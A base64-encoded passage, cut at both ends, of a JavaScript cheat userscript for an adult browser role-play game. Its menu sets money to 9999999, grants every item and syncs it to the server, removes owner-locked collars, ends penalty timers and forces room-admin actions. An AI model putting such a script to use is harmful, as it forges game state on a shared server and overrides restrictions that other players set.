24xOC50ZXh0ID0gIkVtb3RlIE1lbnUgKGAgKyBFKSI7CnZhciBvcHRpb24xOSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoIm9wdGlvbiIpOwpvcHRpb24xOS52YWx1ZSA9ICJvcHQxOSI7Cm9wdGlvbjE5LnRleHQgPSAiUGVyc2lzdGFudCBTZXR0aW5ncyAoYCArIFMpIjsKc2VsZWN0LmFwcGVuZENoaWxkKG9wdGlvbjEpOwpzZWxlY3QuYXBwZW5kQ2hpbGQob3B0aW9uMik7CnNlbGVjdC5hcHBlbmRDaGlsZChvcHRpb24zKTsKc2VsZWN0LmFwcGVuZENoaWxkKG9wdGlvbjQpOwpzZWxlY3QuYXBwZW5kQ2hpbGQob3B0aW9uMTIpOwpzZWxlY3QuYXBwZW5kQ2hpbGQob3B0aW9uNSk7CnNlbGVjdC5hcHBlbmRDaGlsZChvcHRpb242KTsKc2VsZWN0LmFwcGVuZENoaWxkKG9wdGlvbjcpOwpzZWxlY3QuYXBwZW5kQ2hpbGQob3B0aW9uOCk7CnNlbGVjdC5hcHBlbmRDaGlsZChvcHRpb245KTsKc2VsZWN0LmFwcGVuZENoaWxkKG9wdGlvbjEwKTsKc2VsZWN0LmFwcGVuZENoaWxkKG9wdGlvbjExKTsKc2VsZWN0LmFwcGVuZENoaWxkKG9wdGlvbjEzKTsKc2VsZWN0LmFwcGVuZENoaWxkKG9wdGlvbjE0KTsKc2VsZWN0LmFwcGVuZENoaWxkKG9wdGlvbjE2KTsKc2VsZWN0LmFwcGVuZENoaWxkKG9wdGlvbjE3KTsKc2VsZWN0LmFwcGVuZENoaWxkKG9wdGlvbjE4KTsKc2VsZWN0LmFwcGVuZENoaWxkKG9wdGlvbjE5KTsKc2VsZWN0LmFwcGVuZENoaWxkKG9wdGlvbjE1KTsKCgoKLy8gQ3JlYXRlIGEgYnV0dG9uIHRvIHNob3cgdGhlIGRyb3Bkb3duIG1lbnUKdmFyIGRyb3Bkb3duQnV0dG9uID0gY3JlYXRlQnV0dG9uKCJQZXJzb25hbGlzYXRpb24iLCBmdW5jdGlvbigpIHsKICBzZWxlY3Quc3R5bGUuZGlzcGxheSA9ICJibG9jayI7Cn0pOwovLyBDU1MgdG8gbWFrZSB0aGUgYnV0dG9uIGludmlzaWJsZSBhbmQgdGFrZSBubyBzcGFjZQpkcm9wZG93bkJ1dHRvbi5zdHlsZS5vcGFjaXR5ID0gIjAiOwpkcm9wZG93bkJ1dHRvbi5zdHlsZS5wb2ludGVyRXZlbnRzID0gIm5vbmUiOwpkcm9wZG93bkJ1dHRvbi5zdHlsZS5wb3NpdGlvbiA9ICJhYnNvbHV0ZSI7CmRyb3Bkb3duQnV0dG9uLnN0eWxlLnRvcCA9ICItOTk5OXB4IjsKZHJvcGRvd25CdXR0b24uc3R5bGUubGVmdCA9ICItOTk5OXB4IjsKc2VsZWN0LmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgZnVuY3Rpb24oZXZlbnQpIHsKICBldmVudC5zdG9wUHJvcGFnYXRpb24oKTsgCn0pOwoKc2VsZWN0LmFkZEV2ZW50TGlzdGVuZXIoImNoYW5nZSIsIGZ1bmN0aW9uKCkgewogIHZhciBzZWxlY3RlZE9wdGlvbiA9IHNlbGVjdC5vcHRpb25zW3NlbGVjdC5zZWxlY3RlZEluZGV4XS52YWx1ZTsKICBpZiAoc2VsZWN0ZWRPcHRpb24gPT09ICJvcHQxIikgewogICAgLy8gUGVyZm9ybSBhY3Rpb24gZm9yIE9wdGlvbiAxCiAgICBqYXZhc2NyaXB0OlBsYXllci5Nb25leSA9IDk5OTk5OTkKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIGV2ZW50LnN0b3BQcm9wYWdhdGlvbigpOwogICAgZXZlbnQuc3RvcFByb3BhZ2F0aW9uKCk7CiAgICBmb3JjZWNsb3NlbWVudSgpOwogIH0gZWxzZSBpZiAoc2VsZWN0ZWRPcHRpb24gPT09ICJvcHQyIikgewogICAgLy8gUGVyZm9ybSBhY3Rpb24gZm9yIE9wdGlvbiAyCiAgICBqYXZhc2NyaXB0OlBsYXllci5Nb25leSA9IHByb21wdCgiRW50ZXIgQ2FzaCBBbW91bnQiKTsKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIGZvcmNlY2xvc2VtZW51KCk7CiAgfSBlbHNlIGlmIChzZWxlY3RlZE9wdGlvbiA9PT0gIm9wdDMiKSB7CiAgICAvLyBQZXJmb3JtIGFjdGlvbiBmb3IgT3B0aW9uIDMKICAgIGphdmFzY3JpcHQ6U2tpbGxDaGFuZ2UoIkluZmlsdHJhdGlvbiIsIDEwKTsKICAgIFNraWxsQ2hhbmdlKCJTZWxmQm9uZGFnZSIsIDEwKTsvL3NlbGYtdGllCiAgICBTa2lsbENoYW5nZSgiV2lsbHBvd2VyIiwgMTApOy8vUmVzaXN0IG9yZ2FzbXMKICAgIFNraWxsQ2hhbmdlKCJFdmFzaW9uIiwgMTApOy8vQmF0dGxlIHNraWxscwogICAgU2tpbGxDaGFuZ2UoIkJvbmRhZ2UiLCAxMCk7Ly9UaWUgb3RoZXJzCiAgICBTa2lsbENoYW5nZSgiRHJlc3NhZ2UiLCAxMCk7Ly9BQkRMCiAgICBTa2lsbENoYW5nZSgiTG9ja1BpY2tpbmciLCAxMCk7CiAgICBzaG93VG9hc3RzY3BnKCk7CiAgICBmb3JjZWNsb3NlbWVudSgpOwogIH0gZWxzZSBpZiAoc2VsZWN0ZWRPcHRpb24gPT09ICJvcHQ0IikgewogICAgLy8gUGVyZm9ybSBhY3Rpb24gZm9yIE9wdGlvbiA0CiAgICBqYXZhc2NyaXB0OlJlcHV0YXRpb25DaGFuZ2UoIkdhbWluZyIsIDEwMCk7Ly9BcmNhZGUgYW5kIEtpbmt5RHVuZ2VvbgogICAgUmVwdXRhdGlvbkNoYW5nZSgiR2FtYmxpbmciLCAxMDApOy8vR2FtYmxpbmcgcm9vbQogICAgUmVwdXRhdGlvbkNoYW5nZSgiTEFSUCIsIDEwMCk7CiAgICBSZXB1dGF0aW9uQ2hhbmdlKCJNYWlkIiwgMTAwKTsvL0NhbiBiZSBhIE1haWQKICAgIFJlcHV0YXRpb25DaGFuZ2UoIkFCREwiLCAxMDApOwogICAgUmVwdXRhdGlvbkNoYW5nZSgiTnVyc2UiLCAxMDApOy8vQ2FuIGJlIGEgTnVyc2UKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIGZvcmNlY2xvc2VtZW51KCk7CiAgfSBlbHNlIGlmIChzZWxlY3RlZE9wdGlvbiA9PT0gIm9wdDUiKSB7CiAgICAvLyBQZXJmb3JtIGFjdGlvbiBmb3IgT3B0aW9uIDUKICAgIGphdmFzY3JpcHQ6U2VydmVyUGxheWVyU3luYwogICAgQXNzZXRGZW1hbGUzRENHLmZvckVhY2goZ3JvdXA9Pmdyb3VwLkFzc2V0LmZvckVhY2goaXRlbT0+SW52ZW50b3J5QWRkKFBsYXllciwgaXRlbS5OYW1lLCBncm91cC5Hcm91cCkpKTsKICAgIFNlcnZlclBsYXllckludmVudG9yeVN5bmMoKTsKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIGZvcmNlY2xvc2VtZW51KCk7CiAgfSBlbHNlIGlmIChzZWxlY3RlZE9wdGlvbiA9PT0gIm9wdDYiKSB7CiAgICAvLyBQZXJmb3JtIGFjdGlvbiBmb3IgT3B0aW9uIDYKICAgIGphdmFzY3JpcHQ6SW52ZW50b3J5UmVtb3ZlKFBsYXllciwgIkl0ZW1OZWNrIik7CiAgICBDaGF0Um9vbUNoYXJhY3Rlckl0ZW1VcGRhdGUoUGxheWVyLCAiSXRlbU5lY2siKTsKICAgIExvZ0FkZCgiUmVsZWFzZWRDb2xsYXIiLCAiT3duZXJSdWxlIik7IAogICAgc2hvd1RvYXN0c2NwZygpOwogICAgZm9yY2VjbG9zZW1lbnUoKTsKICB9IGVsc2UgaWYgKHNlbGVjdGVkT3B0aW9uID09PSAib3B0NyIpIHsKICAgIC8vIFBlcmZvcm0gYWN0aW9uIGZvciBPcHRpb24gNwogICAgamF2YXNjcmlwdDphbGVydCgnU3RhcnQgYSBMQVJQIHNlc3Npb24gJiBzZWxlY3QgY2xhc3MgYmVmb3JlIHJ1bm5pbmcnKTsKICAgIEdhbWVMQVJQTGV2ZWxQcm9ncmVzcygxMDApIAogICAgc2hvd1RvYXN0c2NwZygpOwogICAgZm9yY2VjbG9zZW1lbnUoKTsKICB9IGVsc2UgaWYgKHNlbGVjdGVkT3B0aW9uID09PSAib3B0OCIpIHsKICAgIC8vIFBlcmZvcm0gYWN0aW9uIGZvciBPcHRpb24gOAogICAgamF2YXNjcmlwdDpMb2dBZGQoIkVzY2FwZWQiLCAiQXN5bHVtIiwgQ3VycmVudFRpbWUgKyA5OTk5OTk5OTkpOwogICAgc2hvd1RvYXN0c2NwZygpOwogICAgZm9yY2VjbG9zZW1lbnUoKTsKICB9IGVsc2UgaWYgKHNlbGVjdGVkT3B0aW9uID09PSAib3B0OSIpIHsKICAgIC8vIFBlcmZvcm0gYWN0aW9uIGZvciBPcHRpb24gOQogICAgamF2YXNjcmlwdDpMb2dBZGQoIkNsdWJTbGF2ZSIsICJNYW5hZ2VtZW50IiwgQ3VycmVudFRpbWUgKyA5OTk5OTk5OTkpOwogICAgc2hvd1RvYXN0c2NwZygpOwogICAgZm9yY2VjbG9zZW1lbnUoKTsKICB9IGVsc2UgaWYgKHNlbGVjdGVkT3B0aW9uID09PSAib3B0MTAiKSB7CiAgICAvLyBQZXJmb3JtIGFjdGlvbiBmb3IgT3B0aW9uIDEwCiAgICBqYXZhc2NyaXB0OkxvZ0FkZCgiRXNjYXBlZCIsICJBc3lsdW0iLCBDdXJyZW50VGltZSk7CiAgICBMb2dBZGQoIkNsdWJTbGF2ZSIsICJNYW5hZ2VtZW50IiwgQ3VycmVudFRpbWUpOwogICAgTG9nQWRkKCJCbG9ja0NoYW5nZSIsICJSdWxlIiwgQ3VycmVudFRpbWUpOwogICAgTWFuYWdlbWVudElzQ2x1YlNsYXZlID0gZnVuY3Rpb24oKSB7CiAgICByZXR1cm4gZmFsc2UKICAgIH0KICAgIE1hbmFnZW1lbnRDbHViU2xhdmVEaWFsb2cgPSBmdW5jdGlvbihQbGF5ZXIpIHt9CiAgICBNYW5hZ2VtZW50RmluaXNoQ2x1YlNsYXZlKCkKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIGZvcmNlY2xvc2VtZW51KCk7CiAgfSBlbHNlIGlmIChzZWxlY3RlZE9wdGlvbiA9PT0gIm9wdDExIikgewogICAgLy8gUGVyZm9ybSBhY3Rpb24gZm9yIE9wdGlvbiAxMQogICAgamF2YXNjcmlwdDphbGVydCgnU3RhcnQgYSBHR1RTIHNlc3Npb24gYmVmb3JlIHJ1bm5pbmcsIHJlZnJlc2ggdG8gc2VlIGNoYW5nZXMnKTsKICAgIFBsYXllci5HYW1lLkdHVFMuTGV2ZWwgPSBwcm9tcHQoIkVudGVyIEdHVFMgTGV2ZWwgKDEtNikiKTs7CiAgICBTZXJ2ZXJBY2NvdW50VXBkYXRlLlF1ZXVlRGF0YSh7CiAgICBHYW1lOiBQbGF5ZXIuR2FtZQogICAgfSk7CiAgICBzaG93VG9hc3RzY3BnKCk7CiAgICBmb3JjZWNsb3NlbWVudSgpOwogICAgCiAgfWVsc2UgaWYgKHNlbGVjdGVkT3B0aW9uID09PSAib3B0MTIiKSB7CiAgICAvLyBQZXJmb3JtIGFjdGlvbiBmb3IgT3B0aW9uIDEyCiAgICBqYXZhc2NyaXB0OkRpYWxvZ1NldFJlcHV0YXRpb24oIkRvbWluYW50IiwgcHJvbXB0KCJFbnRlciBTdWIvRG9tIFJlcCAoLTEwMCB0byAxMDApIikpOwogICAgc2hvd1RvYXN0c2NwZygpOwogICAgZm9yY2VjbG9zZW1lbnUoKTsKICB9ZWxzZSBpZiAoc2VsZWN0ZWRPcHRpb24gPT09ICJvcHQxMyIpIHsKICAgIC8vIFBlcmZvcm0gYWN0aW9uIGZvciBPcHRpb24gMTMKICAgIGphdmFzY3JpcHQ6bmFtZSA9IHByb21wdCgiRW50ZXIgTmlja25hbWUiKTs7CiAgICBQbGF5ZXIuTmlja25hbWUgPSBuYW1lOwogICAgU2VydmVyQWNjb3VudFVwZGF0ZS5RdWV1ZURhdGEoeyBOaWNrbmFtZTogbmFtZSB9LCB0cnVlKTsgICAKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIGZvcmNlY2xvc2VtZW51KCk7ICAKICB9ZWxzZSBpZiAoc2VsZWN0ZWRPcHRpb24gPT09ICJvcHQxNCIpIHsKICAgIC8vIFBlcmZvcm0gYWN0aW9uIGZvciBPcHRpb24gMTQKICAgIGphdmFzY3JpcHQ6QWN0aXZpdHlTZXRBcm91c2FsKFBsYXllciwgMSk7CiAgICBBY3Rpdml0eU9yZ2FzbVByZXBhcmUoUGxheWVyLCB0cnVlKTsKICAgIEFjdGl2aXR5T3JnYXNtR2FtZVJlc2lzdENvdW50ID0gMTsKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIGZvcmNlY2xvc2VtZW51KCk7CiAgfWVsc2UgaWYgKHNlbGVjdGVkT3B0aW9uID09PSAib3B0MTUiKSB7CiAgICAvLyBQZXJmb3JtIGFjdGlvbiBmb3IgT3B0aW9uIDE1CiAgICBqYXZhc2NyaXB0OndpbmRvdy5vcGVuKCdodHRwczovL2Rpc2NvcmQuZ2cvdjNKQmp5UzRteCcsICdfYmxhbmsnKTsKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIGZvcmNlY2xvc2VtZW51KCk7CiAgfWVsc2UgaWYgKHNlbGVjdGVkT3B0aW9uID09PSAib3B0MTYiKSB7CiAgICAvLyBQZXJmb3JtIGFjdGlvbiBmb3IgT3B0aW9uIDE2CiAgICBqYXZhc2NyaXB0OihmdW5jdGlvbigpIHtsZXQgaW5wdXQgPSBwcm9tcHQoIk1hbGUgLyBGZW1hbGUgLyBNaXhlZCIpOwogICAgbGV0IHBsYWNlaG9sZGVyOwogICAgCiAgICBpZiAoaW5wdXQudG9Mb3dlckNhc2UoKSA9PT0gIm1hbGUiKSB7CiAgICAgIHBsYWNlaG9sZGVyID0gIk0iOwogICAgfSBlbHNlIGlmIChpbnB1dC50b0xvd2VyQ2FzZSgpID09PSAibWl4ZWQiKSB7CiAgICAgIHBsYWNlaG9sZGVyID0gIlgiOwogICAgfSBlbHNlIHsKICAgICAgcGxhY2Vob2xkZXIgPSAiIjsKICAgIH0gIAoKICAgIAogICAgQ2hhdFJvb21TdGFydChwbGFjZWhvbGRlciwgIiIsIG51bGwsIG51bGwsICJJbnRyb2R1Y3Rpb24iLCBCYWNrZ3JvdW5kc1RhZ0xpc3QpOwogIH0pKCk7CiAgICBzaG93VG9hc3RzY3BnKCk7CiAgICBmb3JjZWNsb3NlbWVudSgpOwogIH1lbHNlIGlmIChzZWxlY3RlZE9wdGlvbiA9PT0gIm9wdDE3IikgewogICAgLy8gUGVyZm9ybSBhY3Rpb24gZm9yIE9wdGlvbiAxNwogICAgamF2YXNjcmlwdDooZnVuY3Rpb24oKSB7bGV0IGlucHV0ID0gcHJvbXB0KCJTdGFydCBhIExBUlAgUm9vbSBhcyBBZG1pbiBGaXJzdFxuU3RhcnQgLyBTa2lwIC8gTWl4ZWQgLyBTaHVmZmxlIC8gVGVhbSAvIFdpbiAoY29sb3IpIikudG9Mb3dlckNhc2UoKTsKCiAgICBpZiAoaW5wdXQgPT09ICJzdGFydCIpIHsKICAgICAgU2VydmVyU2VuZCgiQ2hhdFJvb21HYW1lIiwgeyBHYW1lUHJvZ3Jlc3M6ICJTdGFydCIgfSk7CiAgICB9IGVsc2UgaWYgKGlucHV0ID09PSAic2tpcCIpIHsKICAgICAgU2VydmVyU2VuZCgiQ2hhdFJvb21HYW1lIiwgeyBHYW1lUHJvZ3Jlc3M6ICJTa2lwIiB9KTsKICAgIH0gZWxzZSBpZiAoaW5wdXQgPT09ICJzaHVmZmxlIikgewogICAgICBTZXJ2ZXJTZW5kKCJDaGF0Um9vbUFkbWluIiwgeyBNZW1iZXJOdW1iZXI6IENoYXRSb29tQ2hhcmFjdGVyWzFdLk1lbWJlck51bWJlciwgQWN0aW9uOiAiU2h1ZmZsZSIgfSk7CiAgICB9IGVsc2UgaWYgKGlucHV0ID09PSAidGVhbSIpIHsKICAgICAgY29uc3QgRGljdGlvbmFyeSA9IG5ldyBEaWN0aW9uYXJ5QnVpbGRlcigpCiAgICAgIC5zb3VyY2VDaGFyYWN0ZXIoUGxheWVyKQogICAgICAuYnVpbGQoKTsKICAgIFNlcnZlclNlbmQoIkNoYXRSb29tQ2hhdCIsIHsgQ29udGVudDogIkxBUlBDaGFuZ2VUZWFtQ2xhc3MiLCBUeXBlOiAiQWN0aW9uIiwgRGljdGlvbmFyeTogRGljdGlvbmFyeSB9KTsKICB9IGVsc2UgaWYgKGlucHV0LnN0YXJ0c1dpdGgoIndpbiIpKSB7CiAgICAgIGxldCBjb2xvciA9IGlucHV0LnNsaWNlKDQpLnRyaW0oKTsKICAgICAgY29sb3IgPSBjb2xvci5jaGFyQXQoMCkudG9VcHBlckNhc2UoKSArIGNvbG9yLnNsaWNlKDEpOwogICAgICBHYW1lTEFSUEFkZENoYXRMb2coIkVuZEdhbWUiLCBQbGF5ZXIsIFBsYXllciwgT25saW5lR2FtZURpY3Rpb25hcnlUZXh0KCJUZWFtIiArIGNvbG9yKSwgMCwgMCwgIiMwMDAwQjAiKTsKICAgIH0KICB9KSgpOwoKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIGZvcmNlY2xvc2VtZW51KCk7CiAgfWVsc2UgaWYgKHNlbGVjdGVkT3B0aW9uID09PSAib3B0MTgiKSB7CiAgICAvLyBQZXJmb3JtIGFjdGlvbiBmb3IgT3B0aW9uIDE4CiAgLy8gQ3JlYXRlIGFuZCBkaXNwbGF5IHRoZSBidXR0b24gY29udGFpbmVyCiAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChidXR0b25Db250YWluZXIpOwogIGJ1dHRvbkNvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gImJsb2NrIjsKICB9ZWxzZSBpZiAoc2VsZWN0ZWRPcHRpb24gPT09ICJvcHQxOSIpIHsKICAgIC8vIFBlcmZvcm0gYWN0aW9uIGZvciBPcHRpb24gMTkKICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoc2V0dGluZ3NNZW51KTsKICAgIHNldHRpbmdzTWVudS5zdHlsZS5kaXNwbGF5ID0gImJsb2NrIjsKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIGZvcmNlY2xvc2VtZW51KCk7CiAgfQogIAoKICAvLyBIaWRlIHRoZSBkcm9wZG93biBtZW51CiAgc2VsZWN0LnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7Cn0pOwoKLy9FbmQgb2YgREQgbWVudV9fX19fX19fX19fX19fX19fX19fX19fX19fX19fCgoKZnVuY3Rpb24gdXBkYXRlQ29udGV4dE1lbnUoKSB7CiAgd2hpbGUgKGNvbnRleHRNZW51LmZpcnN0Q2hpbGQpIHsKICAgIGNvbnRleHRNZW51LnJlbW92ZUNoaWxkKGNvbnRleHRNZW51LmZpcnN0Q2hpbGQpOwogIH0KICBjb250ZXh0TWVudS5hcHBlbmRDaGlsZChoZWFkZXIpOwogIGNvbnRleHRNZW51LmFwcGVuZENoaWxkKGNyZWF0ZVNlcGFyYXRvcigpKTsKICBjb250ZXh0TWVudS5hcHBlbmRDaGlsZChidXR0b24xKTsKICBjb250ZXh0TWVudS5hcHBlbmRDaGlsZChidXR0b24yKTsKICBjb250ZXh0TWVudS5hcHBlbmRDaGlsZChidXR0b24zKTsKICBjb250ZXh0TWVudS5hcHBlbmRDaGlsZChidXR0b240KTsKICBjb250ZXh0TWVudS5hcHBlbmRDaGlsZChidXR0b241KTsKICBjb250ZXh0TWVudS5hcHBlbmRDaGlsZChidXR0b242KTsKICBjb250ZXh0TWVudS5hcHBlbmRDaGlsZChidXR0b243KTsKICBpZiAodmlzYikgewogICAgY29udGV4dE1lbnUuYXBwZW5kQ2hpbGQoYnV0dG9uOCk7CiAgfSBlbHNlIHsKICAgIGNvbnRleHRNZW51LmFwcGVuZENoaWxkKGJ1dHRvbjkpOwogIH0KICBjb250ZXh0TWVudS5hcHBlbmRDaGlsZChidXR0b24xMCk7CiAgLy8gQWRkIHRoZSBkcm9wZG93biBtZW51IHRvIHRoZSBjb250ZXh0IG1lbnUKICBjb250ZXh0TWVudS5hcHBlbmRDaGlsZChjcmVhdGVTZXBhcmF0b3IoKSk7CiAgY29udGV4dE1lbnUuYXBwZW5kQ2hpbGQoZHJvcGRvd25CdXR0b24pOwogIGNvbnRleHRNZW51LmFwcGVuZENoaWxkKHNlbGVjdCk7CiAgCn0KCnVwZGF0ZUNvbnRleHRNZW51KCk7CgovLyBFdmVudCBsaXN0ZW5lciB0byB1cGRhdGUgdGhlIG1lbnUgd2hlbiBvcGVuZWQKY29udGV4dE1lbnUuYWRkRXZlbnRMaXN0ZW5lcignY29udGV4dG1lbnUnLCBmdW5jdGlvbigpIHsKICB1cGRhdGVDb250ZXh0TWVudSgpOwp9KTsKCmRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoY29udGV4dE1lbnUpOwoKICAgIAp9KTsKCi8vIEZ1bmN0aW9uIHRvIGhpZGUgdGhlIGN1c3RvbSBjb250ZXh0IG1lbnUKZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigiY2xpY2siLCBmdW5jdGlvbigpIHsKICAgIGlmIChjb250ZXh0TWVudU9wZW4pIHsKICAgICAgICB2YXIgY29udGV4dE1lbnUgPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCJkaXZbc3R5bGUqPSdmaXhlZCddIik7CiAgICAgICAgaWYgKGNvbnRleHRNZW51KSB7CiAgICAgICAgICAgIGNvbnRleHRNZW51LnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CiAgICAgICAgICAgIENoYXRSb29tQ2xpY2tDaGFyYWN0ZXIoUGxheWVyKTsKICAgICAgICAgICAgRGlhbG9nTGVhdmUoKTsKICAgICAgICB9CiAgICAgICAgY29udGV4dE1lbnVPcGVuID0gZmFsc2U7CiAgICB9Cn0pOwoKCi8vU3RhcnQgb2Yga2V5Ym9hcmQgc2hvcnRjdXRzX19fX19fX19fX19fX19fX19fXwoKbGV0IGJhY2t0aWNrUHJlc3NlZCA9IGZhbHNlOwpsZXQgbGFzdEtleVByZXNzZWQgPSBudWxsOwoKZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigia2V5ZG93biIsIGZ1bmN0aW9uKGV2ZW50KSB7CiAgLy8gY2hlY2sgaWYgdGhlIGJhY2t0aWNrIGtleSBpcyBwcmVzc2VkCiAgaWYgKGV2ZW50LmtleSA9PT0gImAiICYmICFiYWNrdGlja1ByZXNzZWQpIHsKICAgIGJhY2t0aWNrUHJlc3NlZCA9IHRydWU7CiAgfQogIGVsc2UgaWYgKGJhY2t0aWNrUHJlc3NlZCkgewogICAgbGFzdEtleVByZXNzZWQgPSBldmVudC5rZXk7CiAgfQp9KTsKCmRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoImtleXVwIiwgZnVuY3Rpb24oZXZlbnQpIHsKICAvLyBjaGVjayBpZiB0aGUgYmFja3RpY2sga2V5IGlzIHJlbGVhc2VkCiAgaWYgKGV2ZW50LmtleSA9PT0gImAiKSB7CiAgICBiYWNrdGlja1ByZXNzZWQgPSBmYWxzZTsKICAgIGxhc3RLZXlQcmVzc2VkID0gbnVsbDsKICB9Cn0pOwoKLy8gY2hlY2sgaWYgdGhlIGxhc3Qga2V5IHByZXNzZWQgCnNldEludGVydmFsKGZ1bmN0aW9uKCkgewogIGlmIChsYXN0S2V5UHJlc3NlZCA9PT0gIiwiIHx8IGxhc3RLZXlQcmVzc2VkID09PSAiLiIpIHsKICAgIGxldCBhY3Rpb24gPSBsYXN0S2V5UHJlc3NlZCA9PT0gIiwiID8gIk1vdmVMZWZ0IiA6ICJNb3ZlUmlnaHQiOwogICAgU2VydmVyU2VuZCgiQ2hhdFJvb21BZG1pbiIsIHsKICAgICAgTWVtYmVyTnVtYmVyOiBQbGF5ZXIuTWVtYmVyTnVtYmVyLAogICAgICBBY3Rpb246IGFjdGlvbiwKICAgIH0pOwogIH0KfSwgNTApOwovL1N0YXJ0IG9mIFBlcnNpc3RhbnQgTWVudSBfX19fX19fX19fX19fX19fX19fX18KCmNvbnN0IHNldHRpbmdzTWVudSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOwpzZXR0aW5nc01lbnUuaWQgPSAic2V0dGluZ3MtbWVudSI7CnNldHRpbmdzTWVudS5zdHlsZS5wb3NpdGlvbiA9ICJmaXhlZCI7CnNldHRpbmdzTWVudS5zdHlsZS50b3AgPSAiMjBweCI7CnNldHRpbmdzTWVudS5zdHlsZS5sZWZ0ID0gIjIwcHgiOwpzZXR0aW5nc01lbnUuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNmZmYiOwpzZXR0aW5nc01lbnUuc3R5bGUuYm9yZGVyID0gIjFweCBzb2xpZCAjY2NjIjsKc2V0dGluZ3NNZW51LnN0eWxlLnBhZGRpbmcgPSAiM3B4IjsKc2V0dGluZ3NNZW51LnN0eWxlLmJvcmRlclJhZGl1cyA9ICIxMHB4IjsKc2V0dGluZ3NNZW51LnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CnNldHRpbmdzTWVudS5zdHlsZS56SW5kZXggPSAiOTk5OSI7CgovL0JDTSBsb2dvICAgCmNvbnN0IGNvbXBhbnlMb2dvID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaW1nIik7CmNvbXBhbnlMb2dvLnNyYyA9ICJodHRwczovL21lZGlhLmRpc2NvcmRhcHAubmV0L2F0dGFjaG1lbnRzLzc4MTc0OTIyOTMzMTkzOTMyOC8xMDc5NjU5MDE2OTE5MTk1NzQ4L2I2NjQxOTExNzg5N2E5ODgucG5nP3dpZHRoPTExOTAmaGVpZ2h0PTExODkiOwpjb21wYW55TG9nby5zdHlsZS5mbG9hdCA9ICJsZWZ0IjsKY29tcGFueUxvZ28uc3R5bGUubWFyZ2luUmlnaHQgPSAiMTBweCI7CmNvbXBhbnlMb2dvLnN0eWxlLndpZHRoID0gIjQwcHgiOyAvLyBBZGp1c3QgbG9nbyBzaXplIGFzIG5lZWRlZApjb21wYW55TG9nby5zdHlsZS5oZWlnaHQgPSAiNDBweCI7IC8vIEFkanVzdCBsb2dvIHNpemUgYXMgbmVlZGVkCnNldHRpbmdzTWVudS5hcHBlbmRDaGlsZChjb21wYW55TG9nbyk7CgovL09wdGlvbnMgYW5kIHN0eWxlX19fX19fX19fX19fX19fX19fX19fX19fX19fX18KCmNvbnN0IG9wdGlvbjEgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJsYWJlbCIpOwpvcHRpb24xLnRleHRDb250ZW50ID0gIkFudGlibGluZCI7CmNvbnN0IGNoZWNrYm94MSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImlucHV0Iik7CmNoZWNrYm94MS50eXBlID0gImNoZWNrYm94IjsKY2hlY2tib3gxLmlkID0gIm9wdGlvbjEiOwpjaGVja2JveDEuc3R5bGUubWFyZ2luUmlnaHQgPSAiNXB4IjsKY2hlY2tib3gxLnN0eWxlLnZlcnRpY2FsQWxpZ24gPSAibWlkZGxlIjsKb3B0aW9uMS5hcHBlbmRDaGlsZChjaGVja2JveDEpOwpzZXR0aW5nc01lbnUuYXBwZW5kQ2hpbGQob3B0aW9uMSk7Cgpjb25zdCBvcHRpb24yID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgibGFiZWwiKTsKb3B0aW9uMi50ZXh0Q29udGVudCA9ICJSZWFsaXN0aWMgVGFsa2luZyI7CmNvbnN0IGNoZWNrYm94MiA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImlucHV0Iik7CmNoZWNrYm94Mi50eXBlID0gImNoZWNrYm94IjsKY2hlY2tib3gyLmlkID0gIm9wdGlvbjIiOwpjaGVja2JveDIuc3R5bGUubWFyZ2luUmlnaHQgPSAiNXB4IjsKY2hlY2tib3gyLnN0eWxlLnZlcnRpY2FsQWxpZ24gPSAibWlkZGxlIjsKb3B0aW9uMi5hcHBlbmRDaGlsZChjaGVja2JveDIpOwpzZXR0aW5nc01lbnUuYXBwZW5kQ2hpbGQob3B0aW9uMik7Cgpjb25zdCBvcHRpb24zID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgibGFiZWwiKTsKb3B0aW9uMy50ZXh0Q29udGVudCA9ICJTb3VuZCI7CmNvbnN0IGNoZWNrYm94MyA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImlucHV0Iik7CmNoZWNrYm94My50eXBlID0gImNoZWNrYm94IjsKY2hlY2tib3gzLmlkID0gIm9wdGlvbjMiOwpjaGVja2JveDMuc3R5bGUubWFyZ2luUmlnaHQgPSAiNXB4IjsKY2hlY2tib3gzLnN0eWxlLnZlcnRpY2FsQWxpZ24gPSAibWlkZGxlIjsKb3B0aW9uMy5hcHBlbmRDaGlsZChjaGVja2JveDMpOwpzZXR0aW5nc01lbnUuYXBwZW5kQ2hpbGQob3B0aW9uMyk7CgpvcHRpb24xLnN0eWxlLmRpc3BsYXkgPSAiZmxleCI7Cm9wdGlvbjEuc3R5bGUuanVzdGlmeUNvbnRlbnQgPSAiY2VudGVyIjsKb3B0aW9uMS5zdHlsZS5hbGlnbkl0ZW1zID0gImNlbnRlc